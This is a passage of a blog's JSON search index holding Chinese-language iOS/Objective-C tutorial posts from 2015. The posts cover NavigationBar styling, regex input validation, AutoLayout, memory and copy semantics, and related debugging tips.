(void)initialize**函数，系统会自动调用，设置时使用系统单例[UINavigationBar appearance]来设置 123456789@implementation BaseNavigationController+ (void)initialize&#123; &#x2F;&#x2F;设置背景图片 [[UINavigationBar appearance] setBackgroundImage:[[UIImage alloc]init] forBarMetrics:UIBarMetricsDefault]; [[UINavigationBar appearance] setShadowImage:[[UIImage alloc]init]]; &#x2F;&#x2F;设置title文字颜色、大小 [[UINavigationBar appearance] setTitleTextAttributes:@&#123;NSForegroundColorAttributeName:[UIColor whiteColor], NSFontAttributeName:[UIFont fontWithName:@&quot;Arial&quot; size:20.0]&#125;];&#125;@end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"NavigationBar","slug":"NavigationBar","permalink":"http://yoursite.com/tags/NavigationBar/"}]},{"title":"常用的正则校验","date":"2015-11-28T15:00:00.000Z","path":"2015/11/29/常用的正则校验/","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071@interface YZFFormatter : NSObject+ (BOOL)validString:(NSString *)string regx:(NSString *)regx;&#x2F;&#x2F;身份证校验+ (BOOL)validIdentityCard:(NSString *)iDcard;&#x2F;&#x2F;姓名校验+ (BOOL)validName:(NSString *)name;&#x2F;&#x2F;短信验证码校验+ (BOOL)validSmsVerifyCode:(NSString *)smsVerifyCode;&#x2F;&#x2F;图形验证码校验+ (BOOL)validImgVerifyCode:(NSString *)string;&#x2F;&#x2F;手机号校验+ (BOOL)validPhoneNumber:(NSString *)phone;&#x2F;&#x2F;一代身份证+ (BOOL)validFirstIdentityCard:(NSString *)iDcard;&#x2F;&#x2F;港澳通行证+ (BOOL)validGangAoTongXingZheng:(NSString *)cardNo;&#x2F;&#x2F;台湾通行证+ (BOOL)validTaiWanTongXingZheng:(NSString *)cardNo;@end&lt;br&gt;&lt;br&gt;@implementation YZFFormatter+ (BOOL)validString:(NSString *)string regx:(NSString *)regx&#123; NSPredicate *pred &#x3D; [NSPredicate predicateWithFormat:@&quot;SELF MATCHES %@&quot;, regx]; return [pred evaluateWithObject:string];&#125;&#x2F;&#x2F;身份证校验+ (BOOL)validIdentityCard:(NSString *)iDcard&#123; NSString *regx &#x3D; @&quot;^(\\\\d&#123;6&#125;)(18|19|20)?(\\\\d&#123;2&#125;)([01]\\\\d)([0123]\\\\d)(\\\\d&#123;3&#125;)(\\\\d|[Xx])?$&quot;; return [self validString:iDcard regx:regx]; return NO;&#125;&#x2F;&#x2F;姓名校验+ (BOOL)validName:(NSString *)name&#123; NSString *regx &#x3D; @&quot;^[A-Za-z0-9\\u4e00-\\u9fa5]+$&quot;; return [self validString:name regx:regx]; return NO;&#125;&#x2F;&#x2F;短信验证码校验+ (BOOL)validSmsVerifyCode:(NSString *)smsVerifyCode&#123; NSString *regx &#x3D; @&quot;^[0-9]&#123;6&#125;$&quot;; return [self validString:smsVerifyCode regx:regx];&#125;&#x2F;&#x2F;图形验证码校验+ (BOOL)validImgVerifyCode:(NSString *)string&#123; NSString *regx &#x3D; @&quot;^[A-Za-z0-9]&#123;4&#125;$&quot;; return [YZFFormatter validString:string regx:regx];&#125;&#x2F;&#x2F;手机号校验+ (BOOL)validPhoneNumber:(NSString *)phone&#123; NSString *regx &#x3D; @&quot;^[0-9]&#123;11&#125;$&quot;; return [self validString:phone regx:regx]; return NO;&#125;&#x2F;&#x2F;一代身份证+ (BOOL)validFirstIdentityCard:(NSString *)iDcard&#123; NSString *regx &#x3D; @&quot;^[1-9]\\\\d&#123;7&#125;((0\\\\d)|(1[0-2]))(([0|1|2]\\\\d)|3[0-1])\\\\d&#123;3&#125;$&quot;; return [self validString:iDcard regx:regx]; return NO;&#125;&#x2F;&#x2F;港澳通行证+ (BOOL)validGangAoTongXingZheng:(NSString *)cardNo&#123; NSString *regx &#x3D; @&quot;^[A-Za-z0-9]+$&quot;; return [self validString:cardNo regx:regx]; return NO;&#125;&#x2F;&#x2F;台湾通行证+ (BOOL)validTaiWanTongXingZheng:(NSString *)cardNo&#123; NSString *regx &#x3D; @&quot;^T[0-9]&#123;9-11&#125;+$&quot;; return [self validString:cardNo regx:regx]; return NO;&#125;@end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"RegEx","slug":"RegEx","permalink":"http://yoursite.com/tags/RegEx/"}]},{"title":"正向传值和逆向传值","date":"2015-11-28T15:00:00.000Z","path":"2015/11/29/正向传值和逆向传值/","text":"ViewController传值的需求NavigationController本身是一个栈，每个ViewController遵循入栈原则存在其内。假设存在两个个ViewController：A／B依次进入NavigationController 12[self.navigationController pushViewController:A animated:YES];[self.navigationController pushViewController:B animated:YES]; 从A传值到B称为正向传值，从B到A是逆向传值 正向传值正向传值一般采用在B的头文件中声明某个属性(attribute)，然后在A中实例化B时传入，十分简单 1234&#x2F;&#x2F;aVC.m bUIViewController *bVC &#x3D; [[bUIViewController alloc]init]; bVC.attribute &#x3D; _attribute [self.navigationController pushViewController:bVC animated:YES]; 逆向传值逆向传值一般通过协议实现，界面B头文件声明协议，委托给A 123456789101112131415&#x2F;&#x2F;bVC.h define protocol@protocol bViewControllerDelegate &lt;NSObject&gt;- (void)bViewController:(bViewController *)controller attribute:(id)attribute;@end@interface bViewController ()@property (nonatomic, weak) id *delegate&lt;bViewControllerDelegate&gt;;@end&#x2F;&#x2F;aVC.m do protocol bUIViewController *bVC &#x3D; [[bUIViewController alloc]init]; bVC.delegate &#x3D; self; [self.navigationController pushViewController:bVC animated:YES];#pragma mark - bViewControllerDelegate- (void)bViewController:(bViewController *)controller attribute:(id)attribute &#123;&#x2F;&#x2F;can get B attribute&#125; 多窗口代理传值多个窗口之间可以通过弱指针一层层传递进行传值 单例传值声明一个全局唯一存在的单例，来进行访问和修改 奇巧淫技传值(没试过不推荐使用)逆向传值不仅可以通过代理，因为NavgationConroller栈区是存在的，可以在B中栈区作为跳板找到内存中的A传值过去。","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"},{"name":"Protocol","slug":"Protocol","permalink":"http://yoursite.com/tags/Protocol/"}]},{"title":"编译错误duplicate symbols","date":"2015-11-28T15:00:00.000Z","path":"2015/11/29/编译错误duplicate symbols/","text":"错误提示ld: 2 duplicate symbols for architecture arm64少年，这句话的意思是在编译的时候发现有一个类的名字被定义和写了两次，通常是你改了文件名，但是类名起的一样，导致链接的时候发生冲突。编译器不知道应该读哪个文件里的类作为定义。 出现的错误 duplicate symbols,有重复(异议)的符号 解决方法找到重复的地方，从新写或者在target-&gt;Build phases-&gt;compile sources里编译列表去掉一个就可以了","tags":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Error","slug":"Error","permalink":"http://yoursite.com/tags/Error/"}]},{"title":"限制TextField输入位数的方法","date":"2015-11-28T15:00:00.000Z","path":"2015/11/29/限制TextField输入位数的方法/","text":"限制输入位数为n均需要使用UITextFieldDelegate中的方法 12345- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string &#123; if (textField.text.length + string.length &gt; n) &#123; return NO; &#125;&#125; 上述判断条件是利用了删除键的长度为0，即当输入框输入为n位的时候 接收到删除键字符长度为0，n+0=n 不满足判断条件，仍可以改变textField的字符串，使其被删除一位 如果是其它字符，n+1&gt;n满足判断条件TextField就不能被改变 下述判断条件，输入为n时，也是用删除键传入的字符串实际为@””，进行是否在最后一位可以删除的判断 12345- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string &#123; if (textField.text.length &gt; 11 &amp;&amp; ![string isEqualToString:@&quot;&quot;]) &#123; return NO; &#125;&#125; 为什么要对删除键判断如果不进行判断，可能导致输入满n位却无法删除的现象","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"TextField","slug":"TextField","permalink":"http://yoursite.com/tags/TextField/"}]},{"title":"AutoLayoutConstraint","date":"2015-11-22T15:00:00.000Z","path":"2015/11/23/AutoLayoutConstraint/","text":"[干货Example代码](## 干货Example代码) [如何设置AutoLayout](## 如何设置AutoLayout) [如何正确添加AutoLayout](## 如何正确添加AutoLayout) [何时可以确定Frame](## 何时可以确定Frame) [动态更新AutoLayout](## 动态更新AutoLayout) [AutoLayout使用大坑提示](## AutoLayout使用大坑提示) 干货Example代码12345678910111213141516171819202122232425- (void)instituteSubviews &#123; &#x2F;&#x2F;Init Subviews type *name &#x3D; [[type alloc]init]; &#x2F;&#x2F;Weak Point _name &#x3D; name; &#x2F;&#x2F;Add Subviews [view addSubview:_name];&#125;- (void)constrainSubviewsLayout &#123; &#x2F;&#x2F;Set autorizingMask [_name setTranslatesAutoresizingMaskIntoConstraints:NO]; &#x2F;&#x2F;AutoLayout VF NSDictionary *views &#x3D; NSDictionaryOfVariableBindings(_name); NSDictionary *metrics &#x3D; @&#123;&#125;; NSMutableArray *constraints &#x3D; [NSMutableArray array]; [constraints addObjectsFromArray:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;&quot; options:0 metrics:metrics views:views]]; &#x2F;&#x2F; &#x2F;&#x2F;[view addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@&quot;&quot; options:0 metrics:metrics views:views]]; &#x2F;&#x2F;Single &#x2F;&#x2F;[constraints addObject:[NSLayoutConstraint constraintWithItem:_name attribute:attribute relatedBy:relation toItem:_view attribute:attribute multiplier:1.0 constant:0]]; [view addConstraints:constraints];&#125;- (void)modifySubviewsPattern &#123; &#x2F;&#x2F;Modify Pattern&#125; 如何设置AutoLayout一旦使用AutoLayout 的话与之对应的是所有View的Frame就无效了，需要通过指令设置 1[view setTranslatesAutoresizingMaskIntoConstraints:NO]; 添加约束的方法有单条和多条两种，注意后边的“s”，单条约束添加的是NSLayoutConstraint，而多条约束添加的是以NSLayoutConstraint为元素的数组 12[view addConstraint:(NSLayoutConstraint *)constraint];[view addConstraints:(NSArray&lt;__kindof NSLayoutConstraint *&gt; *)constraints]; 对应生成NSLayoutcontraint的方法也有两种，单条生成和生成一个数组，生成数组的方法称为VFL(Visual format language)，类似颜文字的逗比方式 12345&#x2F;* Create constraints explicitly. Constraints are of the form &quot;view1.attr1 &#x3D; view2.attr2 * multiplier + constant&quot; If your equation does not have a second view and attribute, use nil and NSLayoutAttributeNotAnAttribute. *&#x2F;&#x2F;&#x2F;Single[NSLayoutConstraint constraintWithItem:(id)view1 attribute:(NSLayoutAttribute)attr1 relatedBy:(NSLayoutRelation)relation toItem:(nullable id)view2 attribute:(NSLayoutAttribute)attr2 multiplier:(CGFloat)multiplier constant:(CGFloat)c] 就像苹果源文件里注释的一样，单条生成的方法是要遵循一定公式的，公式是可以进行交换运算和乘除的。但是苹果的工作人员发现，这个坑爹的函数实在太长了，以至于最后一个参数的形参只用了一个c，所以才会有VFL 123&#x2F;&#x2F;(NSArray&lt;__kindof NSLayoutConstraint *&gt; *)&#x2F;&#x2F;其中的metrics和views是存放views字符串和metrics参数字符串的字典[NSLayoutConstraint constraintsWithVisualFormat:(NSString *)format options:(NSLayoutFormatOptions)opts metrics:(nullable NSDictionary&lt;NSString *,id&gt; *)metrics views:(NSDictionary&lt;NSString *, id&gt; *)views]; 如何正确添加AutoLayout添加autolayout必须遵循以下原则 最多只需要4条约束来确定一个控件的Frame的（originalX，originalY，Width，Height).即XY坐标和长宽 iOS 7.0之前因为苹果的设计不严密，类似[imageView setImage]这种image自带宽高度的，如果在NSLayoutConstraint里不给定宽高就会报错。 7.0之后如果没有imageView设置宽高，就会去按照图片的宽高来，如果指定了，就会拉伸和缩放。 在确定了四项属性后，需要在正确的View添加上约束 view添加必须正确，［view(父控件) addConstraint:[NSLayoutConstraint constraint(子控件)]］时view必须为父控件，才能控制子控件的布局。 view可以为子控件， 但是仅能控制子控件本身的长宽高 因为控件添加逻辑的较为麻烦，苹果推荐使用[NSLayoutConstraint activateConstraints]和[NSLayoutConstraint deactivateConstraints]和active属性，会自动查找分辨自己的父控件和子控件。但是OS X10.10和iOS 8.0之后才可用 VFL中字符串的意义 H:|[view()]-gap-| H/V: 代表横向和竖向 |: 代表侧边，横向时是左侧边和右侧边，纵向是上下 []: 代表控件View，内部是views添加的控件字符串名字，注意下文大坑提示 (): 代表控件的尺寸，可以直接用梳子，也可以用Metrics中key:value中key的字符串 -: 代表标准间距，貌似是5左右，也可以”-gap-“代表固定间距，gap可以直接为数字，也可以是metric &lt;=/&gt;= : 任意间距和尺寸前可以用大于小于号描述，如”-&gt;=gap-“ 何时可以确定Frame虽然autolayout和控件的Frame互相冲突，但是并不是说Frame始终无法获取。以下是生命周期中可以获取到Frame的函数 UIView: drawRect(); UIViewController: ViewDidAppear(); 动态更新AutoLayout 单条约束动态更新 123456789&#x2F;&#x2F;.h@property (nonatomic, strong) NSLayoutConstraint *constraint;@property (nonatomic, assign) CGFloat oldConstant;@property (nonatomic, assign) CGFloat updatedConstant;&#x2F;&#x2F;.m _constraint &#x3D; [NSLayoutConstraint constraintWithItem:view1 attribute:attr1 relatedBy:relation toItem:view2 attribute:attr2 multiplier:1.0 constant:_oldConstant]; [view addConstraint:_constraint]; &#x2F;&#x2F;通过改变对Constant的值来更新 _constraint.constant &#x3D; _updatedConstant; 多条约束动态更新 1234567891011&#x2F;&#x2F;.h@property (nonatomic, strong) NSArray *oldConstraints;@property (nonatomic, strong) NSArray *updatedConstraints;&#x2F;&#x2F;.m&#x2F;&#x2F;iOS8之前[view removeConstraints:oldConstraints];[view addConstraints:updatedConstraints];[view layoutIfNeeded];&#x2F;&#x2F;iOS8之后[NSLayoutContraint deactivateConstraints:oldConstraints][NSLayoutContraint activateConstraints:updatedConstraints]; 自定义View两套Contraints切换 12345&#x2F;&#x2F;在自定义的View中重载函数- (void)setNeedsLayout;&#x2F;&#x2F;使用时先载入事先写好的Layout然后进行Layout和多条约束可能是同一个原理[view setNeedsLayout];[view layoutIfNeeded]; 以上动态更新都可以放在[UIView animateWithDuration:0.2 animations:^{}]中平滑过渡 AutoLayout使用大坑提示ScrollView的大坑 ScrollView 虽然是[self addConstraint]但是ScrollView不具有右侧边和下侧边，所以不可以在VFL中使用”H:|[view]|”以右侧或者下侧边做为约束的字符串，必须使用“H:|[view(ScreenWidth)]”这种有固定长度的 TableViewCell的大坑 TalbleViewCell的Autolayout需要在ContentView中布局，虽然iOS7种[self addConstraint]可以编译通过，但是会在旧版本带来不可预知错误 VFL的大坑 Metrics里不能有label.5x这样的 不能用小数点 metrics是一个key:value均为字符串的字典，如100应当声明为 @”keyName”:@”100” 生命周期调用大坑 -(void)viewWilllayoutsubviews; 这个函数通过重载也可以用来动态更新，但是7.0和以下需要手动去调用,因为7.0只在生成时调用一次，而8.0之后会每次界面出现都会自动调用 SearchController大坑 searchController和autolayoutConstraint貌似不能一起用，因为SearchController搜索时会发生布局变化造成崩溃 也可能是我当时写的时候自己太挫了，哪里写的不对，这条待验证","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"AutoLayout","slug":"AutoLayout","permalink":"http://yoursite.com/tags/AutoLayout/"}]},{"title":"Debug时添加全局断点","date":"2015-11-22T15:00:00.000Z","path":"2015/11/23/Debug时添加全局断点/","text":"全局断点在Navigator Area的断点管理里点加号选Add Exception Breakpoint 还可以在断点触发后执行一些命令行指令 全局断点有助于发现Crash时崩溃于哪一句","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"关于@property中View变量weak和strong的研究","date":"2015-11-22T15:00:00.000Z","path":"2015/11/23/关于@property中View变量weak和strong的研究/","text":"Weak和Strong的区别 Weak指针可以指向某块内存，但是并不使内存的ARC引用计数＋1 Strong指向某块内存，使得内存的引用计数＋1 干货结论 在头文件中的View使用Strong指针，并且重写Get方法，在访问时初始化 在.m的@interface中使用Weak指针并且在初始化时用addSubView强指向它 123UIView *subView &#x3D; [[UIView alloc]init];&#x2F;&#x2F;实例化一块内存A，然后局部变量指向它_subView &#x3D; subView;&#x2F;&#x2F;全局变量指向A[self.view addSubview:_subView];&#x2F;&#x2F;通过addSubview添加一个强指针到A 为什么这么麻烦(╯°□°）╯︵ ┻━┻如果在.m的interface中使用强指针的话，那么在**[self.view addSubview]**也会存在一个强指针，那么就会有两个Retain。为了保证该内存伴随VC存在，只要VC的addSubview这个强指针一旦被释放就应该被释放，应该似的其Retain始终唯一。 理由： 一条狗应该只用一个绳子牵，绳子一松，狗就跑了，而不是一条狗用两条绳子拴着 ！！！这是什么理由啊 (╯°Д°）╯︵ /(.□ . ) 结论: 就是一个内存管理的强迫症，可以遵循也可以不遵循 强迫症需要注意的地方12_subView &#x3D; [[UIView alloc]init];&#x2F;&#x2F;实例化一块内存A，直接用全局变量指向它[self.view addSubview:_subView];&#x2F;&#x2F;这样会是nil，因为内存A实例化完毕Retain为0直接被释放了","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"},{"name":"Property","slug":"Property","permalink":"http://yoursite.com/tags/Property/"}]},{"title":"深拷贝和浅拷贝","date":"2015-11-22T15:00:00.000Z","path":"2015/11/23/深拷贝浅拷贝/","text":"干货！深拷贝和浅拷贝的区别 深拷贝才是拷贝，浅拷贝就是Retain Copy与Retain的区别 Copy: 根据旧内存空间的对象A开辟一个块新的内存空间新对象B，AB内存地址不同，内容完全一样，B的ARC计数为1，A的ARC计数不变 Retain: 新建一个指针指向旧内存空间的对象A，使A的ARC计数＋1 什么对象可以CopyiOS中并不是所有对象都可以进行Copy，仅有遵循了NSCopying协议的对象才可以进行Copy。所以说自定的NSObject对象需要遵循协议，并且实现**- (id)copyWithZone**这个函数才可以进行Copy 与NSCopying对应的还有NSMutableCopying协议，分别是对固定内存空间和可变内存空间进行Copy 什么样的Copy会开辟新内存 copy任何情况下都是浅拷贝，仅仅是ARC计数器＋1 mutableCopy 任何情况下都是开辟新内存，实现深拷贝，实际是为了避免不同指针对内存空间操作不统一引起报错 alloc 任何情况下都是开辟新内存，虽然可以实现和深拷贝相同的效果，但是本质上就是开辟内存不是拷贝 Archiver/Unarchiver 归档解档，实现真正的深拷贝效果，但是本质上是一种储存读取手段 非容器类NSString的Copy123456789101112131415161718&#x2F;&#x2F;**正常开辟固定字符串a，可变字符串b** NSString *str1 &#x3D; @&quot;a&quot;; NSMutableString *str2 &#x3D; [[NSMutableString alloc]initWithString:@&quot;b&quot;];&#x2F;&#x2F;正常copy NSString *copyStr1 &#x3D; [str1 copy];&#x2F;&#x2F;不变 NSMutableString *copyStr2 &#x3D; [str2 mutableCopy];&#x2F;&#x2F;变&#x2F;&#x2F;错误copy NSMutableString *copyStr3 &#x3D; [str1 mutableCopy];&#x2F;&#x2F;变 NSString *copyStr4 &#x3D; [str2 copy];&#x2F;&#x2F;变&#x2F;&#x2F;**使用错误指针指向固定和可变字符串cd**NSString *str3 &#x3D; [[NSMutableString alloc]initWithString:@&quot;c&quot;]; NSMutableString *str4 &#x3D; @&quot;d&quot;;&#x2F;&#x2F;按照固定错误指针copyNSString *copyStr5 &#x3D; [str3 copy];&#x2F;&#x2F;变NSMutableString *copyStr6 &#x3D; [str3 mutableCopy];&#x2F;&#x2F;变&#x2F;&#x2F;按照可变错误指针copy可变 NSString *copyStr7 &#x3D; [str4 copy];&#x2F;&#x2F;不变NSMutableString *copyStr8 &#x3D; [str4 mutableCopy];&#x2F;&#x2F;变 综上实验，如果实际内存空间和拷贝方法均为不可变时，系统执行浅拷贝，若实际内存空间和拷贝方法有一个为可变时,那么系统就执行深拷贝，开辟新内存。 系统容器NSArray &amp; NSDictionary的Copy系统容器的本身的深拷贝和浅拷贝的规律与NSString一模一样，但是至于容器内元素是否可以通过copyItems进行深拷贝仅仅和元素自己有关 123NSArray *array1 &#x3D; [NSArray arrayWithObjects:@&quot;a&quot;,@&quot;b&quot;,@&quot;c&quot;,nil];&#x2F;&#x2F;开辟内存空间A(存放的array1)NSArray *array2 &#x3D; [array1 copy];&#x2F;&#x2F;由于array1内存不可变，且实用不可变拷贝方法，array2是浅拷贝NSMutableArray *array3 &#x3D; [array1 mutableCopy];&#x2F;&#x2F;由于使用了可变拷贝方法，是深拷贝 由于array1内实际存放的是元素的地址，那么虽rray3和array1的内存地址不同，但是存放的内容（元素地址）是相同的。如果通过array3对其中第一个元素进行了修改，然后通过array1[0]去访问这个元素时，就是array3修改后的值 所以说虽然容器array进行了深拷贝，但是array内部的元素并没有进行拷贝，仅仅是因为多开辟了内存B，出现了同样个数的指针，指向所有元素，让所有元素存在的内存ARC计数＋1而已 123456 NSArray *array1 &#x3D; [NSArray arrayWithObjects:@&quot;a&quot;,@&quot;b&quot;,@&quot;c&quot;,nil];&#x2F;&#x2F;开辟内存空间A(存放的array1) NSArray *array2 &#x3D;[[NSArray alloc] initWithArray:array1 copyItems:YES];&#x2F;&#x2F;先去开辟内存空间B（准备用于存放array2，但是还未存放）&#x2F;&#x2F;对内存空间B根据array1进行初始化，把array1的内容（所有元素的地址）存入内存，多出了一些指针&#x2F;&#x2F;然后对所有元素进行遍历，执行NSCopying协议，每个元素都开辟一块新内存&#x2F;&#x2F;然后把内存空间B中新建的指针分别指向根据NSCopying开辟的新内存 由以上描述可以看出重新初始化一块新内存进行深拷贝，然后根据copyItems去执行NSCopying协议对每个元素也进行深拷贝。 但是，如果容器内元素不自带NSCopying协议，例如自定义的NSObject，那么就会自动对该元素进行浅拷贝，即原内存地址ARC计数＋1 1234 NSArray *array1 &#x3D; [NSArray arrayWithObjects:@&quot;a&quot;,@&quot;b&quot;,@&quot;c&quot;,nil];&#x2F;&#x2F;开辟内存空间A(存放的array1) NSArray *array2 &#x3D; [NSKeyedUnarchiver unarchiveObjectWithData:[NSKeyedArchiver archivedDataWithRootObject: array1]];&#x2F;&#x2F;先把array1的所有元素以及本身存入硬盘(归档)，永久保存，不管array1在内存中是否存在&#x2F;&#x2F;新建array2指向根据从硬盘中读取开辟的新内存B(解档),该内存地址与内存A没有任何关系 在不确定array内部元素是否有遵循NSCopying协议的情况下，这种方法可以进行真正的深拷贝，和原内存地址毫无关系，通过系统读取本地档案的方法来开辟新的内存。 错误指针类型的大坑由于OC中可以使用不可变指针指向可变内存，也可以使用可变指针指向不可变内存 123NSMutableString *str1 &#x3D; @&quot;constant&quot;;NSMutableArray *array1 &#x3D; [[NSArray alloc]init];NSMutableDictionary *dict1 &#x3D; [[NSDictionary alloc]init]; 如上所示，虽然编译器会提示警告，但是编译还是可以通过。 如果没有注意到警告经过多次指向，或者放入了某种容器Array然后取出，警告就会被隐藏。 123NSMutableString *str2 &#x3D; st1;NSMutableArray *array2 &#x3D; array1;NSMutableDictionary *dict2 &#x3D; dict1; 一旦错误的可变内存变量（str2，array2，dict2）执行了类似addValue之类改变内存空间的的指令就会Crash。 大坑: 所以说如果从服务器端接受到了Json字符串最开始存成了不可变的NSDictionary，那么想把其变成可变字典NSMutableDictionary尽兴操作时一定要深拷贝 NSCopying协议示例代码12345678910111213&#x2F;&#x2F;.m@interface myObject : NSObject&lt;NSCopying&gt;@property (nonatomic, copy) NSString *attribute1;@property (nonatomic, copy) NSString *attribute2;@end@implementation myObject- (id)copyWithZone:(NSZone *)zone &#123; myObject *newItem &#x3D; [[myObject allocWithZone:zone] init]; newItem.attribute1 &#x3D; self.attribute1; newItem.attribute2 &#x3D; self.attribute2; return newItem;&#125;@end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"遍历容器中切勿改变容器","date":"2015-11-22T15:00:00.000Z","path":"2015/11/23/遍历容器中切勿改变容器/","text":"遍历容器的时候切勿改变容器在遍历某些可变容器的时候，不能改变容器的长度，不然会报错，因为在查询某一片内存时，改变了有效内存长度就会越界。 123for (id object in mutableArray) &#123; [mutableArray removeobject];&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"NavigationBar设置","date":"2015-11-08T15:00:00.000Z","path":"2015/11/09/NavigationBar设置/","text":"[NavigationBar设置](## NavigationBar设置) NavigationBar设置 设置背景颜色 1[self.navigationController.navigationBar setBarTintColor:[UIColor redColor]]; Translucent设置成透明度,设置成YES会有一种模糊效果 1[self.navigationController.navigationBar setTranslucent:YES]; 设置背景图片，图片样式需要根据情况适用 1[self.navigationController.navigationBar setBackgroundImage:[UIImage imageNamed:@&quot;FlyElephant.png&quot;] forBarMetrics:UIBarMetricsDefault]; 设置NavigationBar标题大小及颜色 之前设置是通过UITextAttributeFont，UITextAttributeTextColor，UITextAttributeTextShadowColor和UITextAttributeTextShadowOffset设置，现在需要都根据NS开头的属性去设置 123NSDictionary *textAttributes&#x3D;@&#123;NSForegroundColorAttributeName:[UIColor whiteColor],NSFontAttributeName:[UIFont systemFontOfSize:20]&#125;;[self.navigationController.navigationBar setTitleTextAttributes:textAttributes]; NavigationBar设置中间的标题或者自定义View 12[self.navigationItem setTitle:@&quot;旅行&quot;];[self.navigationItem setTitleView:[UIImage imageNamed:@&quot;FlyElephant&quot;]; 单个或多个左右Item设置 123456789&#x2F;&#x2F;单个leftItem设置:UIBarButtonItem *leftBarButton&#x3D;[[UIBarButtonItem alloc]initWithImage:[UIImage imageNamed:@&quot;BackIcon&quot;] style:UIBarButtonItemStylePlain target:self action:@selector(popBack)]; [leftBarButton setTintColor:[UIColor colorWithWhite:0 alpha:1]]; self.navigationItem.leftBarButtonItem&#x3D;leftBarButton; &#x2F;&#x2F;多个rightItem设置:UIBarButtonItem *firstItem&#x3D;[[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemReply target:self action:nil];UIBarButtonItem *secondItem&#x3D;[[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemTrash target:self action:nil];NSArray *rightItems&#x3D;@[firstItem, secondItem];self.navigationItem.rightBarButtonItems&#x3D;rightItems;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"NavigationBar","slug":"NavigationBar","permalink":"http://yoursite.com/tags/NavigationBar/"}]},{"title":"改变某段字符串样式以及使用帮助文档的小坑","date":"2015-11-08T15:00:00.000Z","path":"2015/11/09/改变某段字符串样式以及使用帮助文档的小坑/","text":"我想改变一串字符串中一段字体的颜色如果把字符串看成Char组成的Array的话,由于是可变的,那么一定是个Mutable的Array,于是需要用NSMutableAttributedString NSMutableAttributedString *protocolText = [[NSMutableAttributedString alloc]initWithString:@&quot;同意协议&quot;]; [protocolText addAttribute:NSForegroundColorAttributeName value:COLOR_PEACHRED range:NSMakeRange(2, 2)]; //添加成某个Button的Title [_protocolBtn setAttributedTitle:protocolText forState:UIControlStateNormal]; 看到函数不会用尼玛,我是个野路子,没用过 - (void)addAttribute:(NSString *)name value:(id)value range:(NSRange)range; 这个函数,怎么办?而且这个value是个id类型的,我不知道传什么怎么办,百度不到. 去看帮助文档只好拿着这个函数去帮助文档搜索,看到对Value的解释 attributes A dictionary containing the attributes to add. Attribute keys can be supplied by another framework or can be custom ones you define. For information about where to find the system-supplied attribute keys, see the overview section in #NSAttributedString Class Reference#. 其中NSAttributedString Class Reference是个链接,看意思是可以传入的值,于是点进去看看 点进来,我靠好多英文英文好的,基本就可以看得很明白了,讲这里是干嘛用的,英文不好的,只要认识Guide,就知道这个see Attributed String Programming Guide是指导,再进入. 进来后就是Cocoa的全部教程,第一个就是默认的都是哪些 Attributed Strings describes the attributed string objects instantiated from NSAttributedString, NSMutableAttributedString, CFAttributedString and CFMutableAttributedString. 再次进入文档 For example, the text font is stored as an NSFont object under the name given by NSFontAttributeName. 这里的已经写的更明白了,叫For example,就是看NSFontAttributeName 终于找到怎么改了NSForegroundColorAttributeName The value of this attribute is a UIColor object. Use this attribute to specify the color of the text during rendering. If you do not specify this attribute, the text is rendered in black. Available in iOS 6.0 and later. 找到了说明,看懂了之后赶快试一试,因为是字符串嘛,第一反映为把这个作为字符串传进去 [protocolText addAttribute:@&quot;NSForegroundColorAttributeName&quot; value:COLOR_PEACHRED range:NSMakeRange(2, 2)]; 卧槽怎么没效果发现@”NSForegroundColorAttributeName”传入,并没有效果,于是去查NSForegroundColorAttributeName到底是什么 NSString *const NSForegroundColorAttributeName; 发现在OC中是个不变的字符串,头文件中如此定义 UIKIT_EXTERN NSString * const NSForegroundColorAttributeName NS_AVAILABLE(10_0, 6_0); // UIColor, default blackColor 这是什么这个可以去看UIKIT_EXTERN的讲解,总之NSForegroundColorAttributeName是个变量名,其实际字符串并不是这个,通过打印可以得到实际字符串是@”NSColor”;回想函数的第一个值是”id”是个指针类型,并不是String啊!又把C++的习惯带来了…坑 所以说有效的调用是以下两种 [protocolText addAttribute:NSForegroundColorAttributeName value:COLOR_PEACHRED range:NSMakeRange(2, 2)]; //但是第二个比较作死,只是能用,但是不要写 [protocolText addAttribute:@&quot;NSColor&quot; value:COLOR_PEACHRED range:NSMakeRange(2, 2)];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"String","slug":"String","permalink":"http://yoursite.com/tags/String/"}]},{"title":"StatusBar设置","date":"2015-11-06T15:00:00.000Z","path":"2015/11/07/StatusBar设置/","text":"[StatusBar设置](## StatusBar设置) StatusBar设置 StatusBar黑白设置 viewController里重写函数 123- (UIStatusBarStyle)preferredStatusBarStyle &#123; return 